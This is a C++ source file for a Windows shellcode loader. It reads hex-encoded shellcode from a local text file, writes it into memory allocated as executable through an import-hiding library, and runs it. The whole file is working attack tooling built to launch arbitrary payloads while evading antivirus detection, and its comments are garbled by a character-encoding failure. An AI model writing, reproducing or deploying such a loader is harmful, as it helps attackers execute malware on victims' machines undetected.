#include <windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include "lazy_importer.hpp"
using namespace std;

// ��ʮ�������еĵ����ַ�ת��Ϊ��Ӧ������ֵ
unsigned char hexCharToByte(char character) {
    if (character >= '0' && character <= '9') {
        return character - '0';
    }
    if (character >= 'a' && character <= 'f') {
        return character - 'a' + 10;
    }
    if (character >= 'A' && character <= 'F') {
        return character - 'A' + 10;
    }
    return 0;
}

// ��ʮ�������ַ���ת�����ֽ�������
void hexStringToBytes(const std::string& hexString, unsigned char* byteArray, int byteArraySize) {
    for (int i = 0; i < hexString.length(); i += 2) {
        byteArray[i / 2] = hexCharToByte(hexString[i]) * 16 + hexCharToByte(hexString[i + 1]);
    }
}


int main()
{   

    std::ifstream file("shellcode_hex.txt");  //��ָ���ļ�
    
    size_t size;  //�����ļ����ݵ��ֽ���
    string contents; //�����ļ�����
    
    //�ж��ļ��Ƿ�򿪳ɹ�
    if (file.is_open()) {
        std::stringstream buffer; //����һ��stringstream����
        buffer << file.rdbuf();  //���ļ������ݸ��Ƶ�������
        contents = buffer.str();  //��stringstream���������ת��string,������洢��contents��

        size = contents.length()/2;  //��������ʮ�������൱��һ���ֽ�,����ļ����ݳ��������2
        file.close();  //�ر��ļ�
    }
    
    //printf("%d\n", size); 
    //cout << contents;


    // Ϊ�洢ת�����shellcode�����ڴ�
    unsigned char* buffer = (unsigned char*)malloc(size);
    
    // ���ú�����ʮ�������ַ���ת��Ϊ�ֽ�������
    hexStringToBytes(contents, buffer, size);

    // ���ڴ��з���һ�����ִ�е�����
    char* exec = (char*)LI_FN(VirtualAlloc)(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // ��shellcode���Ƶ�������
    memcpy(exec, buffer, size);
    
    // ִ�и�shellcode
    ((void(*) ())exec)();
}